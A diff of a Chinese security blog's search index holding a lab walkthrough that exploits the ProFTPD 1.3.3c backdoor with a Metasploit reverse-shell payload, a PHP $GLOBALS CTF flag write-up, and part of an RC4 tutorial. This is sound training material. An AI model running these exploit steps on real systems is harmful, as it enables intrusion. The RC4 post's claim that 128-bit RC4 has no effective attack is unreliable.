@@ -138,6 +138,66 @@
       </tags>
   </entry>
   <entry>
+    <title>FTP后门服务——ProFTPD 1.3.3c漏洞利用</title>
+    <url>/post/b4a57078.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶场说明"><a href="#一、靶场说明" class="headerlink" title="一、靶场说明"></a>一、靶场说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;链接：<a href="https://pan.baidu.com/s/11qkUtAwCTmOFcLa6e-_tyg">https://pan.baidu.com/s/11qkUtAwCTmOFcLa6e-_tyg</a>  提取码：o7cs</p>
+<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）登录"><a href="#（1）登录" class="headerlink" title="（1）登录"></a>（1）登录</h3><p>&emsp;&emsp;用户名：marlinspike</p>
+<p>&emsp;&emsp;密码：marlinspike</p>
+<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970434351-a8226809-d58b-4c06-8239-e31f4bd7ca4c.png" alt="img"></p>
+<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><h2 id="1、发现靶机IP"><a href="#1、发现靶机IP" class="headerlink" title="1、发现靶机IP"></a>1、发现靶机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
+<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.43.165</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970664244-e68e68dc-e50f-45f5-99b2-096ff0b56e6c.png" alt="img"></p>
+<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970684641-246f0e00-5ff7-41e4-be28-6a98450570f5.png" alt="img"></p>
+<p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970836442-1544788a-8313-450e-9183-904c9a98062a.png" alt="img"></p>
+<h2 id="2、开放端口与服务探测"><a href="#2、开放端口与服务探测" class="headerlink" title="2、开放端口与服务探测"></a>2、开放端口与服务探测</h2><p>&emsp;&emsp;对IP地址进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.103</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;发现开启了FTP服务，且版本为 <strong>ProFTPD 1.3.3c，</strong>而该版本的FTP是存在漏洞的</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970896679-c4fbf558-065c-4e0d-bafd-edc26cbb3c01.png" alt="img"></p>
+<h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><h2 id="1、搜索漏洞exploit"><a href="#1、搜索漏洞exploit" class="headerlink" title="1、搜索漏洞exploit"></a>1、搜索漏洞exploit</h2><p>&emsp;&emsp;Kali使用以下命令查看是否有漏洞利用模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971005152-83a545a7-07e6-475f-9569-6cf63be6fa1b.png" alt="img"></p>
+<p>&emsp;&emsp;打开msf，搜索该版本FTP，查看是否有漏洞利用模，发现漏洞利用模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627713394007-8bec28ff-ef74-4b20-8574-5da0077e32ae.png" alt="img"></p>
+<h2 id="2、exploit"><a href="#2、exploit" class="headerlink" title="2、exploit"></a>2、exploit</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/ftp/proftpd_133c_backdoor  # 使用该漏洞模块</span><br><span class="line">show payloads   # 查看可使用的payload</span><br><span class="line">set payload cmd/unix/reverse   # 选择该攻击载荷</span><br><span class="line">set RHOSTS [靶机IP]   # 设置目标IP</span><br><span class="line">set LHOST [攻击机IP]  # 设置本地IP</span><br><span class="line">exploit   # 发起攻击</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971493775-9ef41297-98f3-4329-9234-f6d051569a01.png" alt="img"></p>
+<h2 id="3、提权"><a href="#3、提权" class="headerlink" title="3、提权"></a>3、提权</h2><p>&emsp;&emsp;使用以下命令查看相关信息，发现已经是root权限了，无需提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">whoami</span><br><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;python调用本地shell实现交互式命令行，同时美化命令行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971852189-8aa50bdc-dd50-41a8-9a41-04a2bd1468c7.png" alt="img"></p>
+<h1 id="四、充电站"><a href="#四、充电站" class="headerlink" title="四、充电站"></a>四、充电站</h1><h2 id="1、什么是FTP"><a href="#1、什么是FTP" class="headerlink" title="1、什么是FTP"></a>1、什么是FTP</h2><p>&emsp;&emsp;是文件传输协议的简称。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。用户可以通过它把自己的PC机与世界各地所有运行FTP协议的服务器相连，访问服务器上的大量程序和信息。</p>
+<p>&emsp;&emsp;FTP 是因特网网络上历史最悠久的网络工具，从 1971 年由 A KBHUSHAN 提出第一个 FTP 的RFC（RFC114）至今近半个世纪来，FTP 凭借其独特的优势一直都是因特网中最重要、最广泛的服务之一。</p>
+<p>&emsp;&emsp;FTP 的目标是提高文件的共享性，提供非直接使用远程计算机，使存储介质对用户透明和可靠高效地传送数据。它能操作任何类型的文件而不需要进一步处理，就像MIME或Unicode一样。但是，FTP有着极高的延时，这意味着，从开始请求到第一次接收需求数据之间的时间，会非常长；并且不时的必须执行一些冗长的登录进程</p>
+<h2 id="2、searchsploit是什么"><a href="#2、searchsploit是什么" class="headerlink" title="2、searchsploit是什么"></a>2、searchsploit是什么</h2><p>&emsp;&emsp;顾名思义，它将搜索所有的漏洞和shellcode。它不会包含任何文件和谷歌黑客数据库的结果</p>
+<p>&emsp;&emsp;searchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力。这种能力特别适用于在没有互联网接入的情况下对网络进行安全评估。许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在我们的Exploit-DB二进制文件中找到。</p>
+<p>&emsp;&emsp;如果您预计您将在一个没有Internet的网络环境进行渗透测试，请确保您检查了两个存储库，以获得最完整的数据集</p>
+]]></content>
+      <categories>
+        <category>综合靶场</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>提权</tag>
+        <tag>FTP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux提权的各种姿势</title>
     <url>/post/927dc08e.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、提权介绍"><a href="#一、提权介绍" class="headerlink" title="一、提权介绍"></a>一、提权介绍</h1><p>&emsp;&emsp;往往我们能拿下服务器的web服务只是具有低权限用户(www-data)，对于内网渗透，我们需要提权到root。Linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。</p>
@@ -206,68 +266,50 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>提权</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
-    <title>FTP后门服务——ProFTPD 1.3.3c漏洞利用</title>
-    <url>/post/b4a57078.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶场说明"><a href="#一、靶场说明" class="headerlink" title="一、靶场说明"></a>一、靶场说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;链接：<a href="https://pan.baidu.com/s/11qkUtAwCTmOFcLa6e-_tyg">https://pan.baidu.com/s/11qkUtAwCTmOFcLa6e-_tyg</a>  提取码：o7cs</p>
-<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）登录"><a href="#（1）登录" class="headerlink" title="（1）登录"></a>（1）登录</h3><p>&emsp;&emsp;用户名：marlinspike</p>
-<p>&emsp;&emsp;密码：marlinspike</p>
-<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970434351-a8226809-d58b-4c06-8239-e31f4bd7ca4c.png" alt="img"></p>
-<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><h2 id="1、发现靶机IP"><a href="#1、发现靶机IP" class="headerlink" title="1、发现靶机IP"></a>1、发现靶机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
-<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.43.165</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+    <title>PHP的$GLOBALS数组</title>
+    <url>/post/b7832a6b.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>$GLOBALS —— 引用全局作用域中可用的全部变量</strong>。</p>
+<p><strong>说明：</strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
+<p><strong>示例：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&quot;foo&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in current scope: &#x27;</span> . <span class="variable">$foo</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;Example content&quot;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="variable">$foo</span> in <span class="keyword">global</span> scope: Example content</span><br><span class="line"><span class="variable">$foo</span> in current scope: local variable</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970664244-e68e68dc-e50f-45f5-99b2-096ff0b56e6c.png" alt="img"></p>
-<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970684641-246f0e00-5ff7-41e4-be28-6a98450570f5.png" alt="img"></p>
-<p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970836442-1544788a-8313-450e-9183-904c9a98062a.png" alt="img"></p>
-<h2 id="2、开放端口与服务探测"><a href="#2、开放端口与服务探测" class="headerlink" title="2、开放端口与服务探测"></a>2、开放端口与服务探测</h2><p>&emsp;&emsp;对IP地址进行扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.103</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;发现开启了FTP服务，且版本为 <strong>ProFTPD 1.3.3c，</strong>而该版本的FTP是存在漏洞的</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970896679-c4fbf558-065c-4e0d-bafd-edc26cbb3c01.png" alt="img"></p>
-<h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><h2 id="1、搜索漏洞exploit"><a href="#1、搜索漏洞exploit" class="headerlink" title="1、搜索漏洞exploit"></a>1、搜索漏洞exploit</h2><p>&emsp;&emsp;Kali使用以下命令查看是否有漏洞利用模块</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971005152-83a545a7-07e6-475f-9569-6cf63be6fa1b.png" alt="img"></p>
-<p>&emsp;&emsp;打开msf，搜索该版本FTP，查看是否有漏洞利用模，发现漏洞利用模块</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627713394007-8bec28ff-ef74-4b20-8574-5da0077e32ae.png" alt="img"></p>
-<h2 id="2、exploit"><a href="#2、exploit" class="headerlink" title="2、exploit"></a>2、exploit</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/ftp/proftpd_133c_backdoor  # 使用该漏洞模块</span><br><span class="line">show payloads   # 查看可使用的payload</span><br><span class="line">set payload cmd/unix/reverse   # 选择该攻击载荷</span><br><span class="line">set RHOSTS [靶机IP]   # 设置目标IP</span><br><span class="line">set LHOST [攻击机IP]  # 设置本地IP</span><br><span class="line">exploit   # 发起攻击</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971493775-9ef41297-98f3-4329-9234-f6d051569a01.png" alt="img"></p>
-<h2 id="3、提权"><a href="#3、提权" class="headerlink" title="3、提权"></a>3、提权</h2><p>&emsp;&emsp;使用以下命令查看相关信息，发现已经是root权限了，无需提权</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">whoami</span><br><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;python调用本地shell实现交互式命令行，同时美化命令行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971852189-8aa50bdc-dd50-41a8-9a41-04a2bd1468c7.png" alt="img"></p>
-<h1 id="四、充电站"><a href="#四、充电站" class="headerlink" title="四、充电站"></a>四、充电站</h1><h2 id="1、什么是FTP"><a href="#1、什么是FTP" class="headerlink" title="1、什么是FTP"></a>1、什么是FTP</h2><p>&emsp;&emsp;是文件传输协议的简称。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。用户可以通过它把自己的PC机与世界各地所有运行FTP协议的服务器相连，访问服务器上的大量程序和信息。</p>
-<p>&emsp;&emsp;FTP 是因特网网络上历史最悠久的网络工具，从 1971 年由 A KBHUSHAN 提出第一个 FTP 的RFC（RFC114）至今近半个世纪来，FTP 凭借其独特的优势一直都是因特网中最重要、最广泛的服务之一。</p>
-<p>&emsp;&emsp;FTP 的目标是提高文件的共享性，提供非直接使用远程计算机，使存储介质对用户透明和可靠高效地传送数据。它能操作任何类型的文件而不需要进一步处理，就像MIME或Unicode一样。但是，FTP有着极高的延时，这意味着，从开始请求到第一次接收需求数据之间的时间，会非常长；并且不时的必须执行一些冗长的登录进程</p>
-<h2 id="2、searchsploit是什么"><a href="#2、searchsploit是什么" class="headerlink" title="2、searchsploit是什么"></a>2、searchsploit是什么</h2><p>&emsp;&emsp;顾名思义，它将搜索所有的漏洞和shellcode。它不会包含任何文件和谷歌黑客数据库的结果</p>
-<p>&emsp;&emsp;searchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力。这种能力特别适用于在没有互联网接入的情况下对网络进行安全评估。许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在我们的Exploit-DB二进制文件中找到。</p>
-<p>&emsp;&emsp;如果您预计您将在一个没有Internet的网络环境进行渗透测试，请确保您检查了两个存储库，以获得最完整的数据集</p>
+<p><strong>注意：</strong></p>
+<ul>
+<li>“Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。  </li>
+<li><strong>变量可用性</strong>。与所有其他超全局变量不同，<code>$GLOBALS</code>在PHP中总是可用的。</li>
+</ul>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><ul>
+<li>页面如下</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632486229240-188bcecb-d4f2-47c2-9b87-a8f58a715bfe.png" alt="img"></p>
+<p>其中正则表达式/^\w+$/，意思是只能有字母和数字</p>
+<ul>
+<li><p>两个//表示开始和结束</p>
+</li>
+<li><p>^表示开始字符串</p>
+</li>
+<li><p>$表示结束字符串</p>
+</li>
+<li><p>\w表示包含【a-z，A-Z, _ , 0-9】</p>
+</li>
+<li><p>+表示一个或者多个\w</p>
+</li>
+<li><p>后面的i表示不区分大小写，在此处没用，因为\w里已经包含了大小写。 </p>
+</li>
+</ul>
+<p>访问 <a href="http://114.67.246.176:12610/?args=GLOBALS%EF%BC%8C%E7%9C%8B%E5%88%B0flag">http://114.67.246.176:12610/?args=GLOBALS，看到flag</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632487926975-c718606e-dab0-4418-9dbf-6e84e2a664a9.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>综合靶场</category>
+        <category>PHP</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>提权</tag>
-        <tag>FTP</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -381,48 +423,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PHP的$GLOBALS数组</title>
-    <url>/post/b7832a6b.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>$GLOBALS —— 引用全局作用域中可用的全部变量</strong>。</p>
-<p><strong>说明：</strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
-<p><strong>示例：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&quot;foo&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in current scope: &#x27;</span> . <span class="variable">$foo</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;Example content&quot;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="variable">$foo</span> in <span class="keyword">global</span> scope: Example content</span><br><span class="line"><span class="variable">$foo</span> in current scope: local variable</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意：</strong></p>
-<ul>
-<li>“Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。  </li>
-<li><strong>变量可用性</strong>。与所有其他超全局变量不同，<code>$GLOBALS</code>在PHP中总是可用的。</li>
-</ul>
-<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><ul>
-<li>页面如下</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632486229240-188bcecb-d4f2-47c2-9b87-a8f58a715bfe.png" alt="img"></p>
-<p>其中正则表达式/^\w+$/，意思是只能有字母和数字</p>
-<ul>
-<li><p>两个//表示开始和结束</p>
-</li>
-<li><p>^表示开始字符串</p>
-</li>
-<li><p>$表示结束字符串</p>
-</li>
-<li><p>\w表示包含【a-z，A-Z, _ , 0-9】</p>
-</li>
-<li><p>+表示一个或者多个\w</p>
-</li>
-<li><p>后面的i表示不区分大小写，在此处没用，因为\w里已经包含了大小写。 </p>
-</li>
-</ul>
-<p>访问 <a href="http://114.67.246.176:12610/?args=GLOBALS%EF%BC%8C%E7%9C%8B%E5%88%B0flag">http://114.67.246.176:12610/?args=GLOBALS，看到flag</a></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632487926975-c718606e-dab0-4418-9dbf-6e84e2a664a9.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Portainer可视化面板安装</title>
     <url>/post/2f19e9de.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
@@ -473,67 +473,6 @@
       <tags>
         <tag>Python</tag>
         <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RC4加密算法</title>
-    <url>/post/9dd1bdb.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;RC4加密算法是一种对称加密算法</p>
-<h1 id="一、对称加密算法"><a href="#一、对称加密算法" class="headerlink" title="一、对称加密算法"></a>一、对称加密算法</h1><p>&emsp;&emsp;对称加密(也叫私钥加密)指加密和解密使用相同<a href="http://baike.baidu.com/view/934.htm">密钥</a>的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。它要求发送方和接收方在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都可以对他们发送或接收的消息解密，所以密钥的保密性对通信的安全性至关重要。 </p>
-<h1 id="二、RC4加密算法"><a href="#二、RC4加密算法" class="headerlink" title="二、RC4加密算法"></a>二、RC4加密算法</h1><h2 id="1、预备知识"><a href="#1、预备知识" class="headerlink" title="1、预备知识"></a>1、预备知识</h2><h3 id="（1）异或"><a href="#（1）异或" class="headerlink" title="（1）异或"></a>（1）异或</h3><p>&emsp;&emsp;学习RC4加密算法之前，首先要知道：<strong>对明文使用同一个密钥异或两次最后是得到原文的</strong></p>
-<h3 id="（2）流密码"><a href="#（2）流密码" class="headerlink" title="（2）流密码"></a>（2）流密码</h3><h4 id="①-定义"><a href="#①-定义" class="headerlink" title="① 定义"></a>① 定义</h4><p>&emsp;&emsp;流密码是对称密码算法，从明文输入流逐位或逐字节产生密文输出。</p>
-<p>&emsp;&emsp;流密码类似于“一次一密”，不同的是“一次一密”使用的是真正的随机数流，而流密码使用的是伪随机数流。</p>
-<h4 id="②-实例"><a href="#②-实例" class="headerlink" title="② 实例"></a>② 实例</h4><p>&emsp;&emsp;使用最广泛的流密码是RC4</p>
-<h4 id="③-流密码结构"><a href="#③-流密码结构" class="headerlink" title="③ 流密码结构"></a>③ 流密码结构</h4><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015605787-f3c732e3-7fb2-42bf-ad9a-46141b10a8b1.png" alt="img"></p>
-<h4 id="④-设计流密码的主要因素"><a href="#④-设计流密码的主要因素" class="headerlink" title="④ 设计流密码的主要因素"></a>④ 设计流密码的主要因素</h4><ol>
-<li><p>加密序列的周期要长，若出现重复的周期过短，容易被破解</p>
-</li>
-<li><p>密钥流应该尽可能地接近真正随机数流的特征</p>
-</li>
-<li><p>密钥长度要长，以避免穷举攻击</p>
-</li>
-</ol>
-<h2 id="2、RC4算法介绍"><a href="#2、RC4算法介绍" class="headerlink" title="2、RC4算法介绍"></a>2、RC4算法介绍</h2><p>&emsp;&emsp;RC4算法是Ron Rivest为RSA公司在1987年设计的一种流密码，作为RSA的商业机密直到1994年才被匿名公布于Internet。</p>
-<p>&emsp;&emsp;该算法是一个可变密钥长度、面向字节操作的流密码。该算法以<strong>随机置换</strong>作为<strong>基础</strong>，其密码周期很可能大于10100，且该算法的运行速度很快。</p>
-<p>&emsp;&emsp;RC4被用于为网络浏览器和服务器间通信而制定的SSL/TLS（安全套接字协议/传输层安全协议）标准中，以及作为IEEE 801.11无线局域网标准一部分的WEP(Wired Equivalent Privacy)协议和新的WiFi受保护访问协议（WPA）中<strong>。****从这些应用来看，RC4构成了当今网络通信的非常重要的部分，因此这个算法非常重要。</strong></p>
-<p>&emsp;&emsp;RC4算法的特点是算法简单，运行速度快，而且密钥长度是可变的，可变范围为1-256字节(8-2048比特)，在如今技术支持的前提下，当密钥长度为128比特时，用暴力法搜索密钥已经不太可行，所以可以预见RC4的密钥范围任然可以在今后相当长的时间里抵御暴力搜索密钥的攻击。实际上，如今也没有找到对于128bit密钥长度的RC4加密算法的有效攻击方法。  </p>
-<h2 id="3、RC4加密原理"><a href="#3、RC4加密原理" class="headerlink" title="3、RC4加密原理"></a>3、RC4加密原理</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015993488-6e14d89f-c789-4c1b-b5b2-5c431304f2d9.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638018567039-e5fed088-41f6-4467-8f34-52543c690500.png" alt="img"></p>
-<p>&emsp;&emsp;RC4算法的原理很简单，包括<strong>初始化算法（KSA）</strong>和**伪随机子密码生成算法（PRGA)**两大部分。</p>
-<h3 id="（1）初始化算法（KSA）"><a href="#（1）初始化算法（KSA）" class="headerlink" title="（1）初始化算法（KSA）"></a>（1）初始化算法（KSA）</h3><h4 id="①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）"><a href="#①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）" class="headerlink" title="① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）"></a>① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）</h4><p>&emsp;&emsp;按照升序，给每个字节赋值0,1,2,3,4,5,6……,254,255</p>
